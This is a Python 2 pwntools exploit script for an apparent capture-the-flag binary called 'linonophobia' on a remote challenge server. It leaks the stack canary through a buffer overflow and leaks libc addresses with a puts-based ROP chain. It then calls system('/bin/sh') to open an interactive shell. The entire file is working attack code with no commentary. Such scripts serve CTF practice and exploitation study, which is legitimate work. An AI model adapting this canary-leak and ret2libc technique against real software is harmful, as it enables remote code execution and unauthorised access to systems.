from pwn import *
#p=process('./linonophobia')
p=remote('chal.imaginaryctf.org',42006)
elf = ELF('./linonophobia')
libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so')
#raw_input("DEBUG")


p.recvuntil('wElCoMe tO mY sErVeR!\n')
p.send("A"*263+"BC")
p.recvuntil("AB")

canary=u64((p.recv(8)))-0x43
print "canary: ",hex(canary)



pop = 0x0000000000400873
payload = "A"*264+p64(canary)+"A"*8
payload += p64(pop)
payload += p64(elf.symbols['got.read'])
payload += p64(elf.symbols['plt.puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)
p.recvuntil("\n")
read_libc=u64((p.recv(6)+'\x00'*2))
print "read_libc: ",hex(read_libc)

p.recvuntil('wElCoMe tO mY sErVeR!\n')
p.send("A"*263+"BC")
p.recvuntil("AB")

payload = "A"*264+p64(canary)+"A"*8
payload += p64(pop)
payload += p64(elf.symbols['got.printf'])
payload += p64(elf.symbols['plt.puts'])
payload += p64(elf.symbols['main'])
p.sendline(payload)
p.recvuntil("\n")
p.recvuntil("\n")
puts_libc=u64((p.recv(6)+'\x00'*2))
print "puts_libc: ",hex(puts_libc)


puts_offset = libc.symbols['puts']
sys_offset =  libc.symbols['system']
bin_offset =  libc.search('/bin/sh').next()
base = puts_libc - puts_offset
print "libc_base: ",hex(base) 
system = base + sys_offset 
bin_sh = base + bin_offset


payload = "A"*264+p64(canary)+"A"*8
payload += p64(pop)
payload += p64(bin_sh)
payload+=p64(0x0000000000400566) #ret
payload += p64(system)
p.sendline(payload)
p.sendline("Done")
p.interactive()